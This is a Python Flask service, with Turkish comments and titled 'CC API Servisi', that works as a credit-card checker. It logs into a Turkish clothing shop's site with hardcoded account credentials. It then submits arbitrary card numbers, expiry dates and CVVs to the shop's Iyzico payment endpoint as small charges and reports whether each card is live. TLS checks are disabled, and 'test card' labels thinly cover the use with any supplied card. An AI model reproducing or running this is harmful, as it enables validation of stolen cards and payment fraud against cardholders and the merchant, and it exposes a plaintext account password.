from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import re
import json

app = Flask(__name__)

# GERÇEK TEST KARTLARI (Iyzico ve bankaların resmi test kartları)
TEST_CARDS = {
    "visa": [
        {"number": "4155650100416111", "cvv": "123", "holder": "John Doe"},
        {"number": "4546711234567894", "cvv": "123", "holder": "John Doe"},
        {"number": "4111111111111111", "cvv": "123", "holder": "John Doe"}  # Universal test
    ],
    "mastercard": [
        {"number": "5406671000000005", "cvv": "123", "holder": "John Doe"},
        {"number": "5431111111111111", "cvv": "123", "holder": "John Doe"},
        {"number": "5504720000000006", "cvv": "123", "holder": "John Doe"}
    ]
}

# Site credentials
USER = "eymeninamina@gmail.com"
PASS = "babapro31"

session = requests.Session()
requests.packages.urllib3.disable_warnings()

def format_json_response(data):
    """JSON çıktısını okunabilir formatta döndür"""
    return json.dumps(data, ensure_ascii=False, indent=4)

def login_to_site():
    """Siteye login ol"""
    try:
        login_get_url = "https://cmrerkekgiyim.com/uyegirisi"
        headers_get = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*"
        }

        res_get = session.get(login_get_url, headers=headers_get, verify=False)
        php_sess = session.cookies.get("PHPSESSID", "")

        login_post_url = "https://cmrerkekgiyim.com/uyeislem.php?islem=girisyap"
        login_headers = {
            "User-Agent": headers_get["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://cmrerkekgiyim.com",
            "Referer": login_get_url,
            "Cookie": f"PHPSESSID={php_sess}"
        }

        login_data = {"eposta": USER, "sifre": PASS}
        res_post = session.post(login_post_url, headers=login_headers, data=login_data, verify=False)

        return "Giriş Başarılı" in res_post.text

    except Exception as e:
        print(f"Login hatası: {e}")
        return False

def get_user_profile():
    """Kullanıcı profil bilgilerini al"""
    try:
        profil_url = "https://cmrerkekgiyim.com/profilim"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        res_profil = session.get(profil_url, headers=headers, verify=False)
        soup = BeautifulSoup(res_profil.text, "html.parser")

        isim_input = soup.find("input", {"id": "profile-first-name"})
        isim = isim_input.get("value", "") if isim_input else "John Doe"

        return isim
    except Exception as e:
        print(f"Profil alma hatası: {e}")
        return "John Doe"

def get_test_card(card_type="visa"):
    """Gerçek test kartı getir"""
    cards = TEST_CARDS.get(card_type.lower(), TEST_CARDS["visa"])
    return cards[0]  # İlk test kartını döndür

# ANA SAYFA - API ÇALIŞIYOR MESAJI
@app.route("/")
def home():
    """Ana sayfa - API çalışıyor mesajı"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>CC API Servisi</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                max-width: 800px; 
                margin: 50px auto; 
                padding: 20px;
                background-color: #f5f5f5;
            }
            .container {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h1 { color: #2c3e50; }
            .status { 
                color: #27ae60; 
                font-weight: bold;
                font-size: 1.2em;
            }
            .endpoint {
                background: #f8f9fa;
                padding: 15px;
                margin: 10px 0;
                border-left: 4px solid #3498db;
                border-radius: 5px;
            }
            code {
                background: #2c3e50;
                color: white;
                padding: 2px 6px;
                border-radius: 3px;
            }
            a {
                color: #3498db;
                text-decoration: none;
            }
            a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 CC API Servisi</h1>
            <p class="status">✅ API aktif ve çalışıyor!</p>
            
            <div class="endpoint">
                <h3>📋 Mevcut Endpoint'ler:</h3>
                <ul>
                    <li><code>/iyzico</code> - Kart doğrulama</li>
                    <li><code>/test-cards</code> - Test kartları listesi</li>
                    <li><code>/quick-test</code> - Hızlı test</li>
                </ul>
            </div>
            
            <div class="endpoint">
                <h3>🔗 Hızlı Bağlantılar:</h3>
                <p><a href="/iyzico?test=true">🧪 Test Modunda Dene</a></p>
                <p><a href="/test-cards">💳 Test Kartlarını Gör</a></p>
                <p><a href="/quick-test">⚡ Hızlı Test Sayfası</a></p>
            </div>
            
            <div class="endpoint">
                <h3>📚 API Kullanımı:</h3>
                <p><strong>Temel kullanım:</strong></p>
                <code>/iyzico?cc=KART_NUMARASI&ay=AA&yil=YYYY&cvv=CVV</code>
                
                <p><strong>Test modu:</strong></p>
                <code>/iyzico?test=true</code>
            </div>
        </div>
    </body>
    </html>
    """

@app.route("/iyzico")
def iyzico():
    try:
        # Parametreleri al
        cc = request.args.get("cc", "").strip()
        ay = request.args.get("ay", "").strip()
        yil = request.args.get("yil", "").strip()
        cvv = request.args.get("cvv", "").strip()
        identity = request.args.get("identityNumber", "").strip()
        use_test = request.args.get("test", "false").lower() == "true"

        # Test modunda ise gerçek test kartını kullan
        if use_test:
            card_type = "visa" if not cc else "visa" if cc.startswith('4') else "mastercard"
            test_card = get_test_card(card_type)
            cc = test_card["number"]
            cvv = test_card["cvv"]
            ay = "12"
            yil = "2026"
            print(f"🔧 TEST MODU: {cc} kullanılıyor")

        # Gerekli parametre kontrolü
        if not all([cc, ay, yil, cvv]):
            response_data = {
                "status": "error",
                "message": "Eksik parametre: cc, ay, yil, cvv gerekli"
            }
            return format_json_response(response_data), 400

        # Siteye login ol
        if not login_to_site():
            response_data = {
                "status": "error",
                "message": "Siteye giriş başarısız"
            }
            return format_json_response(response_data), 403

        # Kullanıcı bilgilerini al
        isim = get_user_profile()

        # İyzico isteği
        iyzico_url = "https://cmrerkekgiyim.com/iyzicoparapuan.php"
        iyzico_data = {
            "toplamtutar": "1",  # Daha düşük tutar deneyelim
            "aciklama": "Test ödemesi",
            "CardHolderName": isim,
            "CardNumber": cc,
            "Expire": f"{ay}/{yil}",
            "x_card_code": cvv,
            "identityNumber": identity or "11111111111",
            "taksit": "1"
        }

        iyz_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://cmrerkekgiyim.com",
            "Referer": "https://cmrerkekgiyim.com/profilim"
        }

        iyz_res = session.post(iyzico_url, headers=iyz_headers, data=iyzico_data, verify=False)

        # Response analizi
        response_text = iyz_res.text.lower()

        # Başarılı durumlar
        success_indicators = [
            "3-d secure", "ödeme başarılı", "işlem başarılı",
            "redirecting", "bank page", "secure3d"
        ]

        if any(indicator in response_text for indicator in success_indicators):
            response_data = {
                "status": "success",
                "message": "✅ Kart geçerli - 3D Secure yönlendirmesi bekleniyor",
                "card": f"{cc[:6]}******{cc[-4:]}",
                "brand": "VISA" if cc.startswith('4') else "MASTERCARD",
                "test_mode": use_test
            }
            return format_json_response(response_data)

        # Hata durumları
        error_patterns = {
            "geçersiz kart": "Geçersiz kart numarası",
            "invalid card": "Geçersiz kart",
            "süresi dolmuş": "Kart süresi dolmuş",
            "expired": "Kart süresi dolmuş",
            "güvenlik kodu": "Geçersiz CVV",
            "cvv": "Geçersiz CVV",
            "güvenlik denetim": "Güvenlik denetimi başarısız"
        }

        for pattern, message in error_patterns.items():
            if pattern in response_text:
                response_data = {
                    "status": "declined",
                    "message": f"❌ {message}",
                    "card": cc,
                    "details": "Bankadan red yanıtı alındı",
                    "test_mode": use_test
                }
                return format_json_response(response_data)

        # HTML hata mesajı ara
        soup = BeautifulSoup(iyz_res.text, "html.parser")
        error_div = soup.find("div", {"class": "alert alert-danger"})

        if error_div:
            error_text = error_div.get_text(strip=True)
            response_data = {
                "status": "declined",
                "message": "❌ İşlem reddedildi",
                "card": cc,
                "details": error_text,
                "test_mode": use_test
            }
            return format_json_response(response_data)
        else:
            # Belirsiz durum
            response_data = {
                "status": "unknown",
                "message": "⚠️ İşlem durumu belirsiz",
                "card": cc,
                "details": "Bankadan net yanıt alınamadı",
                "response_sample": response_text[:200] + "...",
                "test_mode": use_test
            }
            return format_json_response(response_data)

    except Exception as e:
        response_data = {
            "status": "error",
            "message": f"🔥 Sistem hatası: {str(e)}",
            "card": cc if 'cc' in locals() else "Unknown"
        }
        return format_json_response(response_data), 500

# Yeni endpoint: Test kartları listesi
@app.route("/test-cards")
def test_cards():
    """Kullanılabilecek test kartlarını listele"""
    response_data = {
        "test_cards": TEST_CARDS,
        "usage_note": "Bu kartlar sadece test ortamında çalışır",
        "example_request": "/iyzico?test=true&cc=4155650100416111&ay=12&yil=2026&cvv=123"
    }
    return format_json_response(response_data)

# Hızlı test endpoint
@app.route("/quick-test")
def quick_test():
    """Hızlı test için"""
    test_card = get_test_card("visa")
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hızlı Test</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; }}
            .card {{ background: #f8f9fa; padding: 20px; margin: 10px 0; border-radius: 5px; }}
        </style>
    </head>
    <body>
        <h1>🚀 Hızlı Test</h1>
        
        <div class="card">
            <h3>💳 Test Kartı Bilgileri:</h3>
            <p><strong>Kart No:</strong> {test_card['number']}</p>
            <p><strong>CVV:</strong> {test_card['cvv']}</p>
            <p><strong>Son Kullanma:</strong> 12/2026</p>
        </div>
        
        <p><a href="/iyzico?test=true">🔗 Test Modunda Dene (Otomatik)</a></p>
        <p><a href="/iyzico?cc={test_card['number']}&ay=12&yil=2026&cvv={test_card['cvv']}">🔗 Manuel Test</a></p>
        <p><a href="/">🏠 Ana Sayfaya Dön</a></p>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
